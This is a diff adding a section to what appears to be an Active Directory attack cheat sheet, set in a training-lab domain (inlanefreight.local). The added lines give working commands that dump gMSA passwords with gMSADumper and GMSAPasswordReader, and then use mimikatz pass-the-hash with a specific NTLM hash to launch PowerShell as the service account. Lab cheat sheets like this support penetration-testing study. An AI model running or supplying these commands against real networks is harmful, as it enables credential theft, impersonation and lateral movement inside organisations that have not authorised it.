@@ -146,3 +146,17 @@ python3 laps.py -u rita -p Password123 -l 10.129.205.81 -d inlanefreight.local
 ```
 
 ### ReadGMSAPassword
+- https://github.com/rvazarkar/GMSAPasswordReader
+```bash
+python3 gMSADumper.py -d inlanefreight.local -l 10.129.205.81 -u pedro -p SecuringAD01
+```
+```powershell
+.\GMSAPasswordReader.exe --accountname apache-dev
+```
+```
+.\mimikatz.exe privilege::debug "sekurlsa::pth /user:apache-dev$ /domain:inlanefreight.local /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe" exit
+
+mimikatz(commandline) # privilege::debug
+
+mimikatz(commandline) # sekurlsa::pth /user:apache-dev$ /domain:inlanefreight.local /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe
+```
